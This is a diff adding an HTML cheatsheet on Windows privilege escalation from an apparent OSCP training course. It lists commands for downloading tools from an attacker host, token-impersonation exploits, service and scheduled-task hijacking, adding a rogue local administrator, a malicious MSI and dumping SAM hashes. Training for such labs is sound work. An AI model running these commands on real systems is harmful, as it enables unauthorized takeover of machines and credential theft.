@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reference · Windows Privilege Escalation Cheatsheet</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="./links.html">Links</a> · Reference · <strong>Windows Privesc</strong> · <a href="./glossary.html">Glossary</a> · <a href="./linux-privesc.html">Linux Privesc</a></nav>
+
+<span class="kicker">Reference · Low-priv shell → SYSTEM</span>
+<h1>Windows Privilege Escalation Cheatsheet</h1>
+<p class="lead">Commands for <a href="../lessons/0007-windows-privilege-escalation.html">Lesson 07</a>. The reflex: <strong>enumerate inward, kernel last.</strong> Run <code>whoami /priv</code> first — token privileges are the fastest SYSTEM on real boxes. Look up any unknown signed binary on <a href="https://lolbas-project.github.io/">LOLBAS</a>.</p>
+
+<h2>Situational awareness</h2>
+<pre><span class="p">C:\&gt;</span> <span class="o">whoami /priv</span>                 <span class="c"># CHECK FIRST: SeImpersonate/SeBackup = a path</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami /groups</span>               <span class="c"># Administrators? high vs medium integrity</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami /all</span>                  <span class="c"># user SID + privs + groups in one shot</span>
+<span class="p">C:\&gt;</span> <span class="o">systeminfo</span>                   <span class="c"># OS build + hotfixes (save for wesng)</span>
+<span class="p">C:\&gt;</span> <span class="o">hostname</span>
+<span class="p">C:\&gt;</span> <span class="o">net user</span>                     <span class="c"># local users; net user &lt;name&gt; for detail</span>
+<span class="p">C:\&gt;</span> <span class="o">net localgroup administrators</span>   <span class="c"># who is already admin</span>
+<span class="p">C:\&gt;</span> <span class="o">ipconfig /all</span>                <span class="c"># interfaces, DNS — domain hint</span>
+<span class="p">C:\&gt;</span> <span class="o">wmic qfe get HotFixID,InstalledOn</span>   <span class="c"># patch level for kernel-exploit triage</span></pre>
+
+<h2>Automated sweep</h2>
+<pre><span class="c"># WinPEAS — the workhorse; read the RED hits first</span>
+<span class="p">C:\&gt;</span> <span class="o">winPEASx64.exe</span>               <span class="c"># no .NET? use the batch fallback:</span>
+<span class="p">C:\&gt;</span> <span class="o">winPEAS.bat</span>
+<span class="c"># PowerShell, signed-check focused:</span>
+<span class="p">PS&gt;</span> <span class="o">. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended</span>
+<span class="c"># Seatbelt — targeted "safety checks":</span>
+<span class="p">C:\&gt;</span> <span class="o">Seatbelt.exe -group=all</span></pre>
+<span class="cite">Don't read top-to-bottom — jump to the red/highlighted findings, confirm them manually, then exploit.</span>
+
+<h2>File transfer to target</h2>
+<pre><span class="c"># on YOUR box (10.10.14.5) serve the dir, then pull on the target</span>
+<span class="p">$</span> <span class="o">python3 -m http.server 80</span>      <span class="c"># attacker</span>
+<span class="c"># target — certutil (lives on every Windows):</span>
+<span class="p">C:\&gt;</span> <span class="o">certutil -urlcache -f http://10.10.14.5/winPEASx64.exe wp.exe</span>
+<span class="c"># target — PowerShell:</span>
+<span class="p">PS&gt;</span> <span class="o">iwr -uri http://10.10.14.5/f.exe -o f.exe</span>
+<span class="p">PS&gt;</span> <span class="o">(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/f.exe','f.exe')</span>
+<span class="c"># or SMB: on attacker share the cwd, on target copy from it</span>
+<span class="p">$</span> <span class="o">impacket-smbserver share . -smb2support</span>   <span class="c"># attacker</span>
+<span class="p">C:\&gt;</span> <span class="o">copy \\10.10.14.5\share\f.exe f.exe</span></pre>
+
+<h2>Token privileges — the big one</h2>
+<p>The tell: <code>whoami /priv</code> lists <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> (common on service accounts / IIS / MSSQL). Impersonate a SYSTEM token → instant SYSTEM.</p>
+<pre><span class="c"># PrintSpoofer — modern, reliable on 2016/2019/10</span>
+<span class="p">C:\&gt;</span> <span class="o">PrintSpoofer64.exe -i -c cmd</span>
+<span class="c"># GodPotato — works across .NET versions; pick the matching build</span>
+<span class="p">C:\&gt;</span> <span class="o">GodPotato-NET4.exe -cmd "cmd /c whoami"</span>
+<span class="o">nt authority\system</span>
+<span class="c"># JuicyPotato — older boxes only (&lt;= Server 2016 / Win10 1809)</span>
+<span class="p">C:\&gt;</span> <span class="o">JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}</span></pre>
+<span class="cite">Also worth a look in <code>whoami /priv</code>: <strong>SeBackupPrivilege / SeRestorePrivilege</strong> → read SAM + SYSTEM hives (see Stored credentials); <strong>SeDebugPrivilege</strong> → dump/inject into a SYSTEM process (e.g. ProcDump on lsass).</span>
+
+<h2>Service misconfigurations</h2>
+<h3>Enumerate auto-start, non-Windows services</h3>
+<pre><span class="p">C:\&gt;</span> <span class="o">wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"</span></pre>
+<h3>Unquoted service path</h3>
+<pre><span class="c"># path has a SPACE, is unquoted, and you can write to an early dir →</span>
+<span class="c"># "C:\Program Files\My App\svc.exe" → Windows tries C:\Program.exe first</span>
+<span class="p">C:\&gt;</span> <span class="o">sc qc &lt;svc&gt;</span>                  <span class="c"># confirm BINARY_PATH_NAME is unquoted</span>
+<span class="c"># drop evil.exe as "C:\Program Files\My.exe" (or earlier writable dir), then restart</span></pre>
+<h3>Weak service permissions</h3>
+<pre><span class="c"># can you reconfigure the service binary?</span>
+<span class="p">C:\&gt;</span> <span class="o">accesschk.exe -uwcqv "user" *</span>   <span class="c"># SERVICE_CHANGE_CONFIG = win</span>
+<span class="p">C:\&gt;</span> <span class="o">sc config &lt;svc&gt; binpath= "C:\path\evil.exe"</span>   <span class="c"># note the space after binpath=</span>
+<span class="p">C:\&gt;</span> <span class="o">sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;</span>   <span class="c"># or: net stop &lt;svc&gt; &amp; net start &lt;svc&gt;</span>
+<span class="c"># simplest payload — make yourself a local admin:</span>
+<span class="p">C:\&gt;</span> <span class="o">net user pwn Pass123! /add &amp; net localgroup administrators pwn /add</span></pre>
+
+<h2>Registry / AlwaysInstallElevated</h2>
+<pre><span class="p">C:\&gt;</span> <span class="o">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="p">C:\&gt;</span> <span class="o">reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="c"># BOTH must be 0x1. Then any MSI runs as SYSTEM:</span>
+<span class="p">$</span> <span class="o">msfvenom -p windows/x64/exec CMD='net localgroup administrators pwn /add' -f msi &gt; evil.msi</span>
+<span class="p">C:\&gt;</span> <span class="o">msiexec /quiet /qn /i evil.msi</span></pre>
+<span class="cite">One key set without the other does nothing — verify both <code>=0x1</code> before building the MSI.</span>
+
+<h2>Stored credentials</h2>
+<pre><span class="c"># saved runas creds — run a shell as another user without the password</span>
+<span class="p">C:\&gt;</span> <span class="o">cmdkey /list</span>
+<span class="p">C:\&gt;</span> <span class="o">runas /savecred /user:admin cmd</span>
+<span class="c"># answer files left from imaging (often base64 admin password):</span>
+<span class="p">C:\&gt;</span> <span class="o">dir /s /b C:\unattend.xml C:\sysprep.xml C:\Windows\Panther\unattended.xml</span>
+<span class="c"># autologon creds in the registry:</span>
+<span class="p">C:\&gt;</span> <span class="o">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span>
+<span class="c"># PuTTY / WinSCP saved sessions:</span>
+<span class="p">C:\&gt;</span> <span class="o">reg query HKCU\Software\SimonTatham\PuTTY\Sessions</span>
+<span class="c"># SeBackup/SeRestore or admin? grab the hives and dump hashes offline:</span>
+<span class="p">C:\&gt;</span> <span class="o">reg save HKLM\SAM sam &amp; reg save HKLM\SYSTEM system</span>
+<span class="p">$</span> <span class="o">impacket-secretsdump -sam sam -system system LOCAL</span></pre>
+
+<h2>Scheduled tasks</h2>
+<pre><span class="p">C:\&gt;</span> <span class="o">schtasks /query /fo LIST /v</span>   <span class="c"># look for "Run As User: SYSTEM"</span>
+<span class="c"># task runs a script/binary you can WRITE to? overwrite it, wait for the trigger:</span>
+<span class="p">C:\&gt;</span> <span class="o">accesschk.exe -quvw "user" C:\Tasks\backup.bat</span>
+<span class="p">C:\&gt;</span> <span class="o">echo net localgroup administrators pwn /add &gt;&gt; C:\Tasks\backup.bat</span></pre>
+
+<h2>Kernel exploits — last resort</h2>
+<pre><span class="c"># save systeminfo to a file, then map it to public exploits</span>
+<span class="p">C:\&gt;</span> <span class="o">systeminfo &gt; systeminfo.txt</span>
+<span class="p">$</span> <span class="o">wes.py systeminfo.txt</span>          <span class="c"># Windows Exploit Suggester - NG</span>
+<span class="c"># or run Watson on the target for an in-memory check</span></pre>
+<span class="cite">Kernel exploits can bluescreen the box and cost you the foothold — exhaust services, tokens, creds and scheduled tasks first, and only fire one when you can afford a reboot.</span>
+
+<div class="box warn">
+<span class="box-title">Always grab proof</span>
+After landing SYSTEM, confirm with <code>whoami</code> (expect <code>nt authority\system</code>), then read both flags: <code>type C:\Users\Administrator\Desktop\proof.txt</code> and the earlier user <code>local.txt</code>. No proof in the report = no points.
+</div>
+
+<footer>
+<span><a href="../lessons/0007-windows-privilege-escalation.html">← Lesson 07: Windows Privilege Escalation</a></span>
+<span><a href="./glossary.html">Glossary</a> · <a href="./linux-privesc.html">Linux Privesc</a></span>
+</footer>
+
+</body>
+</html>
